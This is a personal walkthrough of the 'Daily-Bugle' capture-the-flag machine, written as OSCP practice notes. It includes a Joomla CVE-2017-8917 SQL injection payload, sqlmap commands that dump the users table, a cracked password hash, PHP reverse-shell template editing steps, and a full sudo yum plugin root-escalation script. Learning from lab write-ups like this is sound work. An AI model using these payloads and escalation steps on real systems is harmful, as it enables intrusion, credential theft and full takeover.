# Daily-Bugle Walkthrough
Name: Daily-Bugle
Date:  23/09/2022
Difficulty:  Hard
Goals:  
- OSCP 2/5 Medium Machines with or without walkthough if needed 
- Practice SQLi revision from the morning
Learnt:
- I need to and have scheduled in a python scripting exploits day 

## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](OS-ProvingGrounds/Apex/Screenshots/ping.png)


[Joomla](https://www.joomla.org/) php 5.6.4
CentOS

![](www-webroot.png)

```
eaa83fe8b963ab08ce9ab7d4a798de05 
f7lrn1l0vo1vv9cmmqqc42d6l4
```

![](misfornatecookie.png)

## Exploit

Blind-Based Boolean SQLi 
![780](cve-2017-8917.png)


From looking [brainwrf](https://github.com/brianwrf/Joomla3.7-SQLi-CVE-2017-8917/blob/master/CVE-2017-8917.py)
```
/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(1,user()),1)
```
![](meanwhile.png)

Scripting Python day is somewhat long over due. I have done lots of l33tcode questions,  but for some reason the request library and solving problems by requesting stuff has yet, but soon stick.. [Assist from Mathias](https://medium.com/@Mathias_Rud/tryhackme-daily-bugle-writeup-35d74fc8df7f) with SQLmap 

```bash
sqlmap -u "http://10.10.94.98/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla -T '#__users' --dump
```

![](johan.png)

`#__users`

```bash
sqlmap -u "http://10.10.83.52/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -C password -D joomla -T "#__users" --dump

bcrypt blowfish
$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm

```

Pure brute forcing with john... `spiderman123`

![](joomlapanel.png)

## Foothold

One of the best resources on the internet: [haax.fr](https://cheatsheet.haax.fr/web-pentest/content-management-system-cms/joomla/)

```
# You must first log as admin
# Then you must activate the PHP extension in settings
System → Component → Media → “php” in legal extensions and nothing in ignored extension

# If it's not enough and the manager is detecting malicious PHP upload, you can still edit templates
# For example, the /index.php on the “protostar" template
→ Use reverse shell from pentestmonkey
→ http://pentestmonkey.net/tools/web-shells/php-reverse-shell

# On old versions, the control panel and features are different, but you can use templates
# First go into templates parameters and activate preview
# Then, on one template it is possible to edit code
# Then it is possible to add shell (weevely for example)
```

![](webshell.png)


## PrivEsc

This part I will do without walkthrough, because 

```bash

uname -a

Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux

cat /etc*-release

CentOS Linux release 7.7.1908 (Core)
NAME="CentOS Linux"
VERSION="7 (Core)"
ID="centos"
ID_LIKE="rhel fedora"
VERSION_ID="7"
PRETTY_NAME="CentOS Linux 7 (Core)"
ANSI_COLOR="0;31"
CPE_NAME="cpe:/o:centos:centos:7"
HOME_URL="https://www.centos.org/"
BUG_REPORT_URL="https://bugs.centos.org/"

CENTOS_MANTISBT_PROJECT="CentOS-7"
CENTOS_MANTISBT_PROJECT_VERSION="7"
REDHAT_SUPPORT_PRODUCT="centos"
REDHAT_SUPPORT_PRODUCT_VERSION="7"

CentOS Linux release 7.7.1908 (Core)
CentOS Linux release 7.7.1908 (Core)

```

![](configuration.png)

Tried login into the mariadb
```bash
bash-4.2$ mysql -u root
ERROR 1045 (28000): Access denied for user 'root'@'localhost' (using password: NO) 
# :(
```

Jonah's reused the password: nv5uz9r3ZEDzVjNu
![](passwordreuse.png)

GTFObins with yum and sudo as:
![](sudol.png)


```bash
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```

![]()
![](root.png)